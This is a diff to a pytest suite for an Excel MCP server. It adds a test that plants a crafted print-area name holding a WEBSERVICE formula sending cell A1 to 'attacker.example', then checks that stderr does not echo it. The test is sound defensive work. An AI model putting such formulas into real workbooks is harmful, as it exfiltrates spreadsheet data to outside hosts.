@@ -4,10 +4,13 @@ import socket
 import subprocess
 import sys
 import time
+import zipfile
 from pathlib import Path
 
 import pytest
-from mcp import Client, StdioServerParameters
+from mcp import Client, ClientSession, StdioServerParameters
+from mcp.client.stdio import stdio_client
+from openpyxl import Workbook
 
 pytestmark = pytest.mark.anyio
 
@@ -21,6 +24,39 @@ async def test_stdio(tmp_path: Path) -> None:
         result = await client.call_tool("create_workbook", {"path": "stdio.xlsx"})
         assert not result.is_error
     assert (tmp_path / "stdio.xlsx").is_file()
+
+
+async def test_stdio_keeps_workbook_content_out_of_stderr(tmp_path: Path) -> None:
+    secret = 'WEBSERVICE("https://attacker.example/?d="&amp;A1)'
+    _write_workbook_with_print_area(tmp_path / "leak.xlsx", secret)
+    params = StdioServerParameters(
+        command=sys.executable,
+        args=["-m", "excel_mcp", "stdio", "--allow-dir", str(tmp_path)],
+    )
+    with (tmp_path / "stderr.txt").open("w+") as errlog:
+        async with stdio_client(params, errlog) as streams, ClientSession(*streams) as session:
+            await session.initialize()
+            result = await session.call_tool("describe_workbook", {"path": "leak.xlsx"})
+            assert not result.is_error
+        errlog.seek(0)
+        assert "attacker.example" not in errlog.read()
+
+
+def _write_workbook_with_print_area(path: Path, print_area: str) -> None:
+    """openpyxl warns, quoting the name, when a print area is not a cell range."""
+    Workbook().save(path)
+    with zipfile.ZipFile(path) as source:
+        parts = {name: source.read(name) for name in source.namelist()}
+    defined_name = (
+        f'<definedNames><definedName name="_xlnm.Print_Area" localSheetId="0">'
+        f"{print_area}</definedName></definedNames>"
+    )
+    parts["xl/workbook.xml"] = parts["xl/workbook.xml"].replace(
+        b"<definedNames />", defined_name.encode()
+    )
+    with zipfile.ZipFile(path, "w") as target:
+        for name, data in parts.items():
+            target.writestr(name, data)
 
 
 def _free_port() -> int:
